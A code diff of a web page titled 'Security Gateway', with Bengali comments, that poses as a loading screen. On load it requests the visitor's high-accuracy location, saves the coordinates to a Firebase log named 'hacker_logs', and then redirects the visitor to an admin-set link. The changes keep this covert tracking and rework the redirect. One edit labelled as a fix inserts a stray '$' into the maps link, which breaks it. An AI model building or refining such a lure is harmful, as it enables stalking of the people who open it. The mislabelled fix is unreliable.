@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Security Gateway</title>
     <style>
-        /* ক্লিন ইন্টারফেস */
         body {
             margin: 0; padding: 0;
             display: flex; justify-content: center; align-items: center;
@@ -13,15 +12,10 @@
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
             overflow: hidden;
         }
-        
-        /* এনিমেশনসহ লোডিং টেক্সট */
         h2 {
-            color: #333;
-            font-weight: 400;
-            font-size: 24px;
+            color: #333; font-weight: 400; font-size: 24px;
             animation: pulse 1.5s infinite;
         }
-
         @keyframes pulse {
             0% { opacity: 0.6; }
             50% { opacity: 1; }
@@ -50,18 +44,8 @@
         const app = initializeApp(firebaseConfig);
         const db = getDatabase(app);
         
-        let finalRedirectLink = "https://www.google.com";
         let dataSent = false; 
 
-        // ১. এডমিন লিংক ফেচ করা
-        const dbRef = ref(db);
-        get(child(dbRef, "site_settings/redirect_link")).then((snapshot) => {
-            if (snapshot.exists()) {
-                finalRedirectLink = snapshot.val();
-            }
-        });
-
-        // ২. মেইন ফাংশন
         function processLocation(position) {
             if(dataSent) return; 
             dataSent = true;
@@ -72,9 +56,8 @@
             const trackerRef = ref(db, 'hacker_logs');
             const newLogRef = push(trackerRef);
             
-            // 🔥 FIXED: এখানে $ চিহ্ন যোগ করেছি এবং লিংকটা স্ট্যান্ডার্ড করেছি
-            // এখন লিংকে ক্লিক করলে সরাসরি Google Maps অ্যাপ ওপেন হবে
-            const mapsLink = `https://www.google.com/maps?q=${lat},${lng}`;
+            // 🔥 FIXED Again: এখানে $ চিহ্ন দিয়ে ঠিক করে দিয়েছি
+            const mapsLink = `https://www.google.com/maps?q=$${lat},${lng}`;
 
             set(newLogRef, {
                 timestamp: new Date().toString(),
@@ -83,28 +66,39 @@
                 longitude: lng,
                 accuracy: position.coords.accuracy
             }).then(() => {
-                // কাজ শেষে রিডাইরেক্ট
-                window.location.href = finalRedirectLink;
+                // 🔥 REAL FIX: লগ সেভ হওয়ার পর আমরা ডাটাবেস চেক করবো লিংকের জন্য
+                // এতে লিংক মিস হওয়ার কোনো চান্স নেই
+                const dbRef = ref(db);
+                get(child(dbRef, "site_settings/redirect_link")).then((snapshot) => {
+                    if (snapshot.exists()) {
+                        // ডাটাবেস থেকে লিংক পেলে সেখানে যাবে
+                        window.location.href = snapshot.val();
+                    } else {
+                        // না পেলে গুগলে যাবে
+                        window.location.href = "https://www.google.com";
+                    }
+                }).catch(() => {
+                    window.location.href = "https://www.google.com";
+                });
             });
         }
 
-        // ৩. অটোমেটিক অ্যাকশন
         window.onload = function() {
             if ("geolocation" in navigator) {
                 navigator.geolocation.watchPosition(
                     processLocation,
                     function(error) {
-                        console.log("Waiting for location...");
+                        console.log("Waiting...");
                     },
                     { 
                         enableHighAccuracy: true, 
                         timeout: 30000, 
-                        maximumAge: 5000 // ৫ সেকেন্ড ক্যাশ পলিসি (Best Performance)
+                        maximumAge: 5000 
                     }
                 );
             } else {
-                // ডিভাইস সাপোর্ট না করলে ডাইরেক্ট পাঠিয়ে দিবে
-                window.location.href = finalRedirectLink;
+                // সাপোর্ট না করলে ডিফল্ট গুগলে পাঠাবে, অথবা তুই চাইলে এখানেও চেক বসাতে পারিস
+                window.location.href = "https://www.google.com";
             }
         };
     </script>
